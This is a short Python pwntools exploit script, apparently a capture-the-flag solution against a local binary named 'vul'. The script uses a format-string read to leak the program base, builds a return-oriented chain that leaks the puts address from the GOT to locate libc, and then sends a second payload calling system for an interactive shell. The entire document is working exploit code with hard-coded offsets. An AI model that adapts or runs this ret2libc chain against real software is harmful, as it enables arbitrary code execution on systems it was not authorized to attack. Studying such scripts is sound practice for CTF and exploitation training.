from pwn import *

vul = process("./vul")

#Part 0 finding the adress..
# format_string = b'%lx|' * 40
# vul.sendline(format_string)
# print(vul.recvline())

offset = 0x1080
vul.sendline(b'%33$lx')
leaked_address = vul.recvline()
leaked_address = int(str(leaked_address).split(' ')[3][:-3], 16)
actual_address = leaked_address - offset
log.success("Text section base address is leaked " + hex(leaked_address))
log.success("Actual text section address is " + hex(actual_address))
'''PART 2 we will leak the addres of puts or printf...'''
puts_plt = 0x1040 + actual_address
puts_got  = 0x3fc0 + actual_address
pop_rdi = 0x128b + actual_address
start = 0x1080 + actual_address
ret = 0x1016 + actual_address
puts_actual = 0x75e10 #LIBC ADDRESS....
junk = b'A' * 216
payload = junk + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start)
vul.sendline(payload)
vul.recvline()
puts_leaked = u64(vul.recvline().strip().ljust(8, b'\00'))
offset_libc = puts_leaked - puts_actual
log.success("Puts address leaked " + hex(puts_leaked))
log.success("Libc actuall base address " + hex(offset_libc))
junk  = b'A' * 40
system = 0x49860 + offset_libc
arg = 0x198882 + offset_libc
payload = junk + p64(pop_rdi) + p64(arg) + p64(system)
vul.sendline(payload)
vul.interactive()